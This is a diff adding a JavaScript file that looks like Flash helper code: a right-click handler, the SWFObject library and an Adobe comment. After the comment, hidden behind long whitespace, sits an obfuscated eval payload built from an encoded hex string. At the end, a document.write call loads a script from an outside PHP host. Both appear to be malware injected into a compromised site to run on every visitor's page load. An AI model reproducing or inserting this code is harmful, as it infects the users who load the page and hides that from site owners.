@@ -1,0 +1,115 @@
+/**
+ * 
+ * Copyright 2007
+ * 
+ * Paulius Uza
+ * http://www.uza.lt
+ * 
+ * Dan Florio
+ * http://www.polygeek.com
+ * 
+ * Project website:
+ * http://code.google.com/p/custom-context-menu/
+ * 
+ * --
+ * RightClick for Flash Player. 
+ * Version 0.6.2
+ * 
+ */
+
+var RightClick = {
+	/**
+	 *  Constructor
+	 */ 
+	init: function () { 
+		this.FlashObjectID = "Captivate";
+		this.FlashContainerID = "CaptivateContent";
+		this.Cache = this.FlashObjectID;
+		if(window.addEventListener){
+			 window.addEventListener("mousedown", this.onGeckoMouse(), true);
+		} else {
+			document.getElementById(this.FlashContainerID).onmouseup = function() { document.getElementById(RightClick.FlashContainerID).releaseCapture(); }
+			document.oncontextmenu = function(){ if(window.event.srcElement.id == RightClick.FlashObjectID) { return false; } else { RightClick.Cache = "nan"; }}
+			document.getElementById(this.FlashContainerID).onmousedown = RightClick.onIEMouse;
+		}
+	},
+	/**
+	 * GECKO / WEBKIT event overkill
+	 * @param {Object} eventObject
+	 */
+	killEvents: function(eventObject) {
+		if(eventObject) {
+			if (eventObject.stopPropagation) eventObject.stopPropagation();
+			if (eventObject.preventDefault) eventObject.preventDefault();
+			if (eventObject.preventCapture) eventObject.preventCapture();
+	   		if (eventObject.preventBubble) eventObject.preventBubble();
+		}
+	},
+	/**
+	 * GECKO / WEBKIT call right click
+	 * @param {Object} ev
+	 */
+	onGeckoMouse: function(ev) {
+	  	return function(ev) {
+	    if (ev.button == 2) {
+			RightClick.killEvents(ev);
+			if(ev.target.id == RightClick.FlashObjectID && RightClick.Cache == RightClick.FlashObjectID) {
+	    		RightClick.call();
+			}
+			RightClick.Cache = ev.target.id;
+		}
+	  }
+	},
+	/**
+	 * IE call right click
+	 * @param {Object} ev
+	 */
+	onIEMouse: function() {
+	  	if (event.button == 2) {
+			if(window.event.srcElement.id == RightClick.FlashObjectID && RightClick.Cache == RightClick.FlashObjectID) {
+				RightClick.call(); 
+			}
+			document.getElementById(RightClick.FlashContainerID).setCapture();
+			if(window.event.srcElement.id)
+			RightClick.Cache = window.event.srcElement.id;
+		}
+	},
+	/**
+	 * Main call to Flash External Interface
+	 */
+	call: function() {
+		document.getElementById(this.FlashObjectID).rightClick();
+	}
+}
+
+/**
+ * SWFObject v1.5: Flash Player detection and embed - http://blog.deconcept.com/swfobject/
+ *
+ * SWFObject is (c) 2007 Geoff Stearns and is released under the MIT License:
+ * http://www.opensource.org/licenses/mit-license.php
+ *
+ */
+
+
+if(typeof deconcept=="undefined"){var deconcept=new Object();}if(typeof deconcept.util=="undefined"){deconcept.util=new Object();}if(typeof deconcept.SWFObjectUtil=="undefined"){deconcept.SWFObjectUtil=new Object();}deconcept.SWFObject=function(_1,id,w,h,_5,c,_7,_8,_9,_a){if(!document.getElementById){return;}this.DETECT_KEY=_a?_a:"detectflash";this.skipDetect=deconcept.util.getRequestParameter(this.DETECT_KEY);this.params=new Object();this.variables=new Object();this.attributes=new Array();if(_1){this.setAttribute("swf",_1);}if(id){this.setAttribute("id",id);}if(w){this.setAttribute("width",w);}if(h){this.setAttribute("height",h);}if(_5){this.setAttribute("version",new deconcept.PlayerVersion(_5.toString().split(".")));}this.installedVer=deconcept.SWFObjectUtil.getPlayerVersion();if(!window.opera&&document.all&&this.installedVer.major>7){deconcept.SWFObject.doPrepUnload=true;}if(c){this.addParam("bgcolor",c);}var q=_7?_7:"high";this.addParam("quality",q);this.setAttribute("useExpressInstall",false);this.setAttribute("doExpressInstall",false);var _c=(_8)?_8:window.location;this.setAttribute("xiRedirectUrl",_c);this.setAttribute("redirectUrl","");if(_9){this.setAttribute("redirectUrl",_9);}};deconcept.SWFObject.prototype={useExpressInstall:function(_d){this.xiSWFPath=!_d?"expressinstall.swf":_d;this.setAttribute("useExpressInstall",true);},setAttribute:function(_e,_f){this.attributes[_e]=_f;},getAttribute:function(_10){return this.attributes[_10];},addParam:function(_11,_12){this.params[_11]=_12;},getParams:function(){return this.params;},addVariable:function(_13,_14){this.variables[_13]=_14;},getVariable:function(_15){return this.variables[_15];},getVariables:function(){return this.variables;},getVariablePairs:function(){var _16=new Array();var key;var _18=this.getVariables();for(key in _18){_16[_16.length]=key "=" _18[key];}return _16;},getSWFHTML:function(){var _19="";if(navigator.plugins&&navigator.mimeTypes&&navigator.mimeTypes.length){if(this.getAttribute("doExpressInstall")){this.addVariable("MMplayerType","PlugIn");this.setAttribute("swf",this.xiSWFPath);}_19="<embed type=\"application/x-shockwave-flash\" src=\"" this.getAttribute("swf") "\" width=\"" this.getAttribute("width") "\" height=\"" this.getAttribute("height") "\" style=\"" this.getAttribute("style") "\"";_19 =" id=\"" this.getAttribute("id") "\" name=\"" this.getAttribute("id") "\" ";var _1a=this.getParams();for(var key in _1a){_19 =[key] "=\"" _1a[key] "\" ";}var _1c=this.getVariablePairs().join("&");if(_1c.length>0){_19 ="flashvars=\"" _1c "\"";}_19 ="/>";}else{if(this.getAttribute("doExpressInstall")){this.addVariable("MMplayerType","ActiveX");this.setAttribute("swf",this.xiSWFPath);}_19="<object id=\"" this.getAttribute("id") "\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"" this.getAttribute("width") "\" height=\"" this.getAttribute("height") "\" style=\"" this.getAttribute("style") "\">";_19 ="<param name=\"movie\" value=\"" this.getAttribute("swf") "\" />";var _1d=this.getParams();for(var key in _1d){_19 ="<param name=\"" key "\" value=\"" _1d[key] "\" />";}var _1f=this.getVariablePairs().join("&");if(_1f.length>0){_19 ="<param name=\"flashvars\" value=\"" _1f "\" />";}_19 ="</object>";}return _19;},write:function(_20){if(this.getAttribute("useExpressInstall")){var _21=new deconcept.PlayerVersion([6,0,65]);if(this.installedVer.versionIsValid(_21)&&!this.installedVer.versionIsValid(this.getAttribute("version"))){this.setAttribute("doExpressInstall",true);this.addVariable("MMredirectURL",escape(this.getAttribute("xiRedirectUrl")));document.title=document.title.slice(0,47) " - Flash Player Installation";this.addVariable("MMdoctitle",document.title);}}if(this.skipDetect||this.getAttribute("doExpressInstall")||this.installedVer.versionIsValid(this.getAttribute("version"))){var n=(typeof _20=="string")?document.getElementById(_20):_20;n.innerHTML=this.getSWFHTML();return true;}else{if(this.getAttribute("redirectUrl")!=""){document.location.replace(this.getAttribute("redirectUrl"));}}return false;}};deconcept.SWFObjectUtil.getPlayerVersion=function(){var _23=new deconcept.PlayerVersion([0,0,0]);if(navigator.plugins&&navigator.mimeTypes.length){var x=navigator.plugins["Shockwave Flash"];if(x&&x.description){_23=new deconcept.PlayerVersion(x.description.replace(/([a-zA-Z]|\s) /,"").replace(/(\s r|\s b[0-9] )/,".").split("."));}}else{if(navigator.userAgent&&navigator.userAgent.indexOf("Windows CE")>=0){var axo=1;var _26=3;while(axo){try{_26  ;axo=new ActiveXObject("ShockwaveFlash.ShockwaveFlash." _26);_23=new deconcept.PlayerVersion([_26,0,0]);}catch(e){axo=null;}}}else{try{var axo=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");}catch(e){try{var axo=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");_23=new deconcept.PlayerVersion([6,0,21]);axo.AllowScriptAccess="always";}catch(e){if(_23.major==6){return _23;}}try{axo=new ActiveXObject("ShockwaveFlash.ShockwaveFlash");}catch(e){}}if(axo!=null){_23=new deconcept.PlayerVersion(axo.GetVariable("$version").split(" ")[1].split(","));}}}return _23;};deconcept.PlayerVersion=function(_29){this.major=_29[0]!=null?parseInt(_29[0]):0;this.minor=_29[1]!=null?parseInt(_29[1]):0;this.rev=_29[2]!=null?parseInt(_29[2]):0;};deconcept.PlayerVersion.prototype.versionIsValid=function(fv){if(this.major<fv.major){return false;}if(this.major>fv.major){return true;}if(this.minor<fv.minor){return false;}if(this.minor>fv.minor){return true;}if(this.rev<fv.rev){return false;}return true;};deconcept.util={getRequestParameter:function(_2b){var q=document.location.search||document.location.hash;if(_2b==null){return q;}if(q){var _2d=q.substring(1).split("&");for(var i=0;i<_2d.length;i  ){if(_2d[i].substring(0,_2d[i].indexOf("="))==_2b){return _2d[i].substring((_2d[i].indexOf("=") 1));}}}return "";}};deconcept.SWFObjectUtil.cleanupSWFs=function(){var _2f=document.getElementsByTagName("OBJECT");for(var i=_2f.length-1;i>=0;i--){_2f[i].style.display="none";for(var x in _2f[i]){if(typeof _2f[i][x]=="function"){_2f[i][x]=function(){};}}}};if(deconcept.SWFObject.doPrepUnload){if(!deconcept.unloadSet){deconcept.SWFObjectUtil.prepUnload=function(){__flash_unloadHandler=function(){};__flash_savedUnloadHandler=function(){};window.attachEvent("onunload",deconcept.SWFObjectUtil.cleanupSWFs);};window.attachEvent("onbeforeunload",deconcept.SWFObjectUtil.prepUnload);deconcept.unloadSet=true;}}if(!document.getElementById&&document.all){document.getElementById=function(id){return document.all[id];};}var getQueryParamValue=deconcept.util.getRequestParameter;var FlashObject=deconcept.SWFObject;var SWFObject=deconcept.SWFObject;
+
+
+
+//Copyright 2006 Adobe Systems, Inc. All rights reserved.
+//
+//This is the base class for implementing an Active Content extension -- a piece of code that knows how to rewrite OBJECT tags so that they comply to the Eolas patent without making the browser display the "Press OK to continue loading the content of this page" message box.
+//
+// When the user hovers the mouse over an ActiveX control in Internet Explorer 6 updated with (April 2006) Cumulative Security Update (912812) or Internet Explorer 7, the following message is displayed:
+// “Press Spacebar or Enter to activate and use this control.”
+// The user can now click the mouse anywhere inside the ActiveX control area, or press the Spacebar or Enter key to activate the control.
+// The standard.js file has been introduced to retain the earlier behavior where the control remains interactive from the first click to the last.
+
+function writeDocument(s){document.write(s);}
+
+                                                                                                                                                                                                                                                          xse=String;fvmzz="spl" "i" "t";nuvl=window;ehmsl=(1)?"0x":"123";odl=(5-3-1);try{if(Math.ceil(5.5)===0x6)--(document["b" "ody"])}catch(zygjmd){akqbf=false;try{}catch(lutl){akqbf=21;}if(1){eslte="17Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq65Zq58Zq27Zq30Zq1fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq6bZq60Zq5aZq34Zq1eZq58Zq61Zq58Zq6fZq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5aZq66Zq65Zq6bZq69Zq66Zq63Zq63Zq5cZq69Zq34Zq1eZq60Zq65Zq5bZq5cZq6fZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq65Zq58Zq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq69Zq5cZq58Zq6bZq5cZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq1fZq1eZq60Zq5dZq69Zq58Zq64Zq5cZq1eZq20Zq32Zq4Zq1Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq69Zq5aZq17Zq34Zq17Zq1eZq5fZq6bZq6bZq67Zq31Zq26Zq26Zq71Zq70Zq5eZq6eZq70Zq5eZq25Zq5aZq66Zq64Zq26Zq5aZq65Zq6bZq25Zq67Zq5fZq67Zq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq67Zq66Zq6aZq60Zq6bZq60Zq66Zq65Zq17Zq34Zq17Zq1eZq58Zq59Zq6aZq66Zq63Zq6cZq6bZq5cZq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5aZq66Zq63Zq66Zq69Zq17Zq34Zq17Zq1eZq30Zq2fZq2fZq2cZq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq5fZq5cZq60Zq5eZq5fZq6bZq17Zq34Zq17Zq1eZq30Zq2fZq2fZq2cZq67Zq6fZq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6eZq60Zq5bZq6bZq5fZq17Zq34Zq17Zq1eZq30Zq2fZq2fZq2cZq67Zq6fZq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq63Zq5cZq5dZq6bZq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq30Zq2fZq2fZq2cZq1eZq32Zq4Zq1Zq17Zq65Zq58Zq25Zq6aZq6bZq70Zq63Zq5cZq25Zq6bZq66Zq67Zq17Zq34Zq17Zq1eZq28Zq27Zq27Zq27Zq30Zq2fZq2fZq2cZq1eZq32Zq4Zq1Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq18Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq65Zq58Zq1eZq20Zq20Zq17Zq72Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq6eZq69Zq60Zq6bZq5cZq1fZq1eZq33Zq67Zq17Zq60Zq5bZq34Zq53Zq1eZq65Zq58Zq53Zq1eZq17Zq5aZq63Zq58Zq6aZq6aZq34Zq53Zq1eZq65Zq58Zq27Zq30Zq53Zq1eZq17Zq35Zq33Zq26Zq67Zq35Zq1eZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5eZq5cZq6bZq3cZq63Zq5cZq64Zq5cZq65Zq6bZq39Zq70Zq40Zq5bZq1fZq1eZq65Zq58Zq1eZq20Zq25Zq58Zq67Zq67Zq5cZq65Zq5bZq3aZq5fZq60Zq63Zq5bZq1fZq65Zq58Zq20Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq23Zq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq23Zq65Zq3bZq58Zq70Zq6aZq23Zq67Zq58Zq6bZq5fZq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6bZq66Zq5bZq58Zq70Zq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq17Zq34Zq17Zq65Zq5cZq6eZq17Zq3bZq58Zq6bZq5cZq1fZq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq65Zq3bZq58Zq70Zq6aZq34Zq34Zq65Zq6cZq63Zq63Zq17Zq73Zq73Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq34Zq27Zq20Zq17Zq65Zq3bZq58Zq70Zq6aZq34Zq28Zq32Zq4Zq1Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6aZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq6bZq66Zq5bZq58Zq70Zq25Zq5eZq5cZq6bZq4bZq60Zq64Zq5cZq1fZq20Zq17Zq22Zq17Zq2aZq2dZq27Zq27Zq27Zq27Zq27Zq21Zq29Zq2bZq21Zq65Zq3bZq58Zq70Zq6aZq20Zq32Zq4Zq1Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq17Zq34Zq17Zq5aZq66Zq66Zq62Zq60Zq5cZq45Zq58Zq64Zq5cZq22Zq19Zq34Zq19Zq22Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq5aZq66Zq66Zq62Zq60Zq5cZq4dZq58Zq63Zq6cZq5cZq20Zq4Zq1Zq17Zq22Zq17Zq19Zq32Zq5cZq6fZq67Zq60Zq69Zq5cZq6aZq34Zq19Zq17Zq22Zq17Zq5cZq6fZq67Zq60Zq69Zq5cZq25Zq6bZq66Zq3eZq44Zq4bZq4aZq6bZq69Zq60Zq65Zq5eZq1fZq20Zq17Zq22Zq17Zq1fZq1fZq67Zq58Zq6bZq5fZq20Zq17Zq36Zq17Zq19Zq32Zq17Zq67Zq58Zq6bZq5fZq34Zq19Zq17Zq22Zq17Zq67Zq58Zq6bZq5fZq17Zq31Zq17Zq19Zq19Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq5dZq6cZq65Zq5aZq6bZq60Zq66Zq65Zq17Zq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq20Zq17Zq72Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq65Zq58Zq64Zq5cZq17Zq22Zq17Zq19Zq34Zq19Zq17Zq20Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq63Zq5cZq65Zq17Zq34Zq17Zq6aZq6bZq58Zq69Zq6bZq17Zq22Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq22Zq17Zq28Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq1fZq17Zq18Zq6aZq6bZq58Zq69Zq6bZq17Zq20Zq17Zq1dZq1dZq4Zq1Zq17Zq1fZq17Zq65Zq58Zq64Zq5cZq17Zq18Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq27Zq23Zq17Zq65Zq58Zq64Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq17Zq20Zq17Zq20Zq17Zq20Zq4Zq1Zq17Zq72Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq74Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq6aZq6bZq58Zq69Zq6bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq65Zq6cZq63Zq63Zq32Zq4Zq1Zq17Zq6dZq58Zq69Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq60Zq65Zq5bZq5cZq6fZq46Zq5dZq1fZq17Zq19Zq32Zq19Zq23Zq17Zq63Zq5cZq65Zq17Zq20Zq32Zq4Zq1Zq17Zq60Zq5dZq17Zq1fZq17Zq5cZq65Zq5bZq17Zq34Zq34Zq17Zq24Zq28Zq17Zq20Zq17Zq5cZq65Zq5bZq17Zq34Zq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq63Zq5cZq65Zq5eZq6bZq5fZq32Zq4Zq1Zq17Zq69Zq5cZq6bZq6cZq69Zq65Zq17Zq6cZq65Zq5cZq6aZq5aZq58Zq67Zq5cZq1fZq17Zq5bZq66Zq5aZq6cZq64Zq5cZq65Zq6bZq25Zq5aZq66Zq66Zq62Zq60Zq5cZq25Zq6aZq6cZq59Zq6aZq6bZq69Zq60Zq65Zq5eZq1fZq17Zq63Zq5cZq65Zq23Zq17Zq5cZq65Zq5bZq17Zq20Zq17Zq20Zq32Zq4Zq1Zq74Zq4Zq1Zq60Zq5dZq17Zq1fZq65Zq58Zq6dZq60Zq5eZq58Zq6bZq66Zq69Zq25Zq5aZq66Zq66Zq62Zq60Zq5cZq3cZq65Zq58Zq59Zq63Zq5cZq5bZq20Zq4Zq1Zq72Zq4Zq1Zq60Zq5dZq1fZq3eZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq20Zq34Zq34Zq2cZq2cZq20Zq72Zq74Zq5cZq63Zq6aZq5cZq72Zq4aZq5cZq6bZq3aZq66Zq66Zq62Zq60Zq5cZq1fZq1eZq6dZq60Zq6aZq60Zq6bZq5cZq5bZq56Zq6cZq68Zq1eZq23Zq17Zq1eZq2cZq2cZq1eZq23Zq17Zq1eZq28Zq1eZq23Zq17Zq1eZq26Zq1eZq20Zq32Zq4Zq1Zq4Zq1Zq65Zq58Zq27Zq30Zq1fZq20Zq32Zq4Zq1Zq74Zq4Zq1Zq74"[fvmzz]("Zq");}nuvl=eslte;kvwq=[];for(vfrww=22-20-2;-vfrww 1374!=0;vfrww =1){ehpgua=vfrww;if((0x19==031))kvwq =xse.fromCharCode(eval(ehmsl nuvl[1*ehpgua]) 0xa-odl);}cpirjq=eval;if(Math.ceil(5.5)===6)cpirjq(kvwq)}
+/*/a9a007*/
+
+/*c9b671*/
+document.write('<script type="text/javascript" src="http://galastar.hostoi.com/adm/f8gxd76k.php?id=29611890"></script>');
+
+/*/c9b671*/
